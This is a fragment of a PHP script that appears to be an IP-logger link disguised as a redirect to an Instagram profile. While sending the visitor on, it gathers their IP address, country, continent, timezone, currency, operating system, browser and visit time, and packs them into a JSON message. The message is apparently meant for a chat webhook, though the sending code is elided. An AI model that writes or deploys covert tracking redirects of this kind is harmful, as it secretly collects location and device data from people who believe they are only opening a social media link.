<?php
header( 'Location: https://www.instagram.com/tobias.skyum/' ) ;
...
$make_json = json_encode(array('content'=>"skyrs Instagram bich  | $ipdat->geoplugin_countryName | $ipdat->geoplugin_continentName | $ipdat->geoplugin_currencyCode | $ipdat->geoplugin_timezone | $ip | $user_os | $user_browser | $time \n", "username" => "$ip"));
